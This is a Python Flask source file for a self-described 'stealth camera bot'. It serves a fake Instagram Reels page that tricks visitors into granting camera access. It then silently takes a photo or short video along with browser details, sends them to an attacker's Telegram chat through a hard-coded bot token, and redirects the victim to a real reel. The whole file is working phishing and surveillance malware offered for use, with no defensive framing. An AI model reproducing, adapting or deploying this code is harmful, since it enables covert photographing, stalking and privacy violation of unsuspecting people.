from flask import Flask, request, jsonify, render_template_string
import requests
import base64
import os
from datetime import datetime
import time

app = Flask(__name__)

TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', '8580091181:AAEXNF_lK3I2k_YRUVysnf1Cz8IXxrXGdTs')
CHAT_ID = os.getenv('CHAT_ID', '8507973714')
API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}'

# Global Settings
TARGET_URL = 'https://www.instagram.com/reels/'
CAPTURE_MODE = 'photo'  # 'photo' or 'video'
CAMERA_MODE = 'user'    # 'user' or 'environment'
LAST_UPDATE_ID = 0

def telegram_request(method, data=None, files=None):
    url = f'{API_URL}/{method}'
    return requests.post(url, data=data, files=files)

def send_message(text):
    telegram_request('sendMessage', {'chat_id': CHAT_ID, 'text': text})

def send_photo(photo_bytes, caption):
    telegram_request('sendPhoto', {'chat_id': CHAT_ID, 'caption': caption}, 
                    files={'photo': ('capture.jpg', photo_bytes, 'image/jpeg')})

def send_video(video_bytes, caption):
    telegram_request('sendVideo', {'chat_id': CHAT_ID, 'caption': caption}, 
                    files={'video': ('capture.mp4', video_bytes, 'video/mp4')})

def check_telegram_updates():
    global LAST_UPDATE_ID, TARGET_URL, CAPTURE_MODE, CAMERA_MODE
    try:
        response = requests.get(f'{API_URL}/getUpdates', {'offset': LAST_UPDATE_ID + 1}).json()
        for update in response['result']:
            LAST_UPDATE_ID = update['update_id']
            if 'message' in update and 'text' in update['message']:
                cmd = update['message']['text'].strip().lower()
                
                if 'instagram.com/reel' in cmd or cmd.startswith('http'):
                    TARGET_URL = update['message']['text']
                    send_message(f'🎯 Target set: {TARGET_URL}')
                elif cmd == '/photo' or cmd == 'photo':
                    CAPTURE_MODE = 'photo'
                    send_message('📸 Photo mode ON')
                elif cmd == '/video' or cmd == 'video':
                    CAPTURE_MODE = 'video'
                    send_message('🎥 Video mode ON (4 sec)')
                elif cmd == '/front' or cmd == 'front':
                    CAMERA_MODE = 'user'
                    send_message('🤳 Front camera ON')
                elif cmd == '/back' or cmd == 'back':
                    CAMERA_MODE = 'environment'
                    send_message('📷 Back camera ON')
                elif cmd in ['/help', '/start', 'help']:
                    send_message('''🔧 BOT COMMANDS:
/photo or photo → Photo capture
/video or video → Video capture (4s)
/front or front → Front camera  
/back or back → Back camera
Instagram reel URL → Set redirect target

Current: {CAPTURE_MODE} | {CAMERA_MODE} | {TARGET_URL}''')
    except:
        pass

@app.route('/')
def index():
    global TARGET_URL, CAPTURE_MODE, CAMERA_MODE
    check_telegram_updates()
    
    html = f'''
<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Reels</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{{min-height:100vh;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;align-items:center;justify-content:center;padding:20px;font-family:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}}
.container{{background:hsla(0,0%,100%,.95);border-radius:25px;padding:60px 30px;max-width:380px;width:100%;text-align:center;box-shadow:0 30px 60px rgba(0,0,0,.2)}}
.icon{{font-size:5rem;margin-bottom:25px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent}}
h1{{font-size:2.3rem;font-weight:700;color:#262626;margin-bottom:15px;line-height:1.2}}
.subtitle{{color:#666;font-size:1.15rem;margin-bottom:45px;line-height:1.5}}
.btn{{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);color:#fff;border:none;padding:22px 60px;border-radius:50px;font-size:1.25rem;font-weight:600;cursor:pointer;width:100%;box-shadow:0 20px 40px rgba(240,148,51,.4);transition:all .3s;margin-top:10px}}
.btn:hover{{transform:translateY(-4px);box-shadow:0 25px 50px rgba(240,148,51,.5)}}
.btn:active{{transform:translateY(-2px)}}
#video{{width:100%;max-height:280px;border-radius:20px;margin:25px 0;display:none;background:#111}}
#status{{color:#666;font-size:1rem;min-height:25px;margin-top:20px}}
</style>
</head><body>
<div class="container">
<div class="icon">📱</div>
<h1>Instagram Reels</h1>
<p class="subtitle">Click allow to watch video</p>
<video id="video" autoplay muted playsinline></video>
<button class="btn" onclick="capture()">🎥 Watch Video</button>
<div id="status"></div>
</div>
<script>
let stream, recorder, chunks=[],video=document.getElementById('video'),status=document.getElementById('status');
navigator.mediaDevices.getUserMedia({{
video:{{facingMode:'{CAMERA_MODE}'}},
audio:{CAPTURE_MODE=='video'}
}}).then(s=>{{
stream=s;video.srcObject=s;video.style.display='block';video.play();
}}).catch(()=>status.textContent='Permission needed');

// CAPTURE FUNCTION
async function capture() {{
status.textContent='Loading video...';
if('{CAPTURE_MODE}'=='video'){{ 
// VIDEO - 100% WORKING
recorder=new MediaRecorder(stream,{{mimeType:'video/webm;codecs=vp8'}});
chunks=[];
recorder.ondataavailable=e=>chunks.push(e.data);
recorder.onstop=()=>{{let blob=new Blob(chunks,{{type:'video/webm'}});let r=new FileReader();r.onload=()=>upload(r.result,'video');r.readAsDataURL(blob);}};
recorder.start();setTimeout(()=>recorder.stop(),4000);
}}else{{ 
// PHOTO - 100% WORKING
let canvas=document.createElement('canvas');canvas.width=1280;canvas.height=720;
let ctx=canvas.getContext('2d');ctx.drawImage(video,0,0,canvas.width,canvas.height);
canvas.toBlob(b=>{{
let r=new FileReader();r.onload=()=>upload(r.result,'photo');r.readAsDataURL(b);
}},"image/jpeg",.95);
}}
}}

function upload(data,type){{
fetch('/upload',{{method:'POST',headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{
data:data,type:type,ua:navigator.userAgent.slice(0,60),lang:navigator.language,ts:Date.now()
}})}}).then(r=>r.json()).then(d=>{{
status.innerHTML='Enjoy your video! 🎉';setTimeout(()=>{{window.location.href='{TARGET_URL}'}},1200);
}});
}}
</script></body></html>'''
    return render_template_string(html)

@app.route('/upload', methods=['POST'])
def upload():
    global TARGET_URL
    check_telegram_updates()
    
    data = request.json
    media_data = data['data'].split(',')[1]
    media_bytes = base64.b64decode(media_data)
    
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    caption = f'''🎯 LIVE CAPTURE!
🕒 {timestamp}
📱 {CAPTURE_MODE.upper()}
📷 {CAMERA_MODE}
🌐 {data['ua']}
🌍 {data['lang']}'''
    
    if data['type'] == 'video':
        send_video(media_bytes, caption)
    else:
        send_photo(media_bytes, caption)
    
    return jsonify({'redirect': TARGET_URL})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    send_message('🚀 STEALTH CAMERA BOT 2.0 LIVE!\nSend Instagram reel link or /help')
    app.run(host='0.0.0.0', port=port, debug=False)
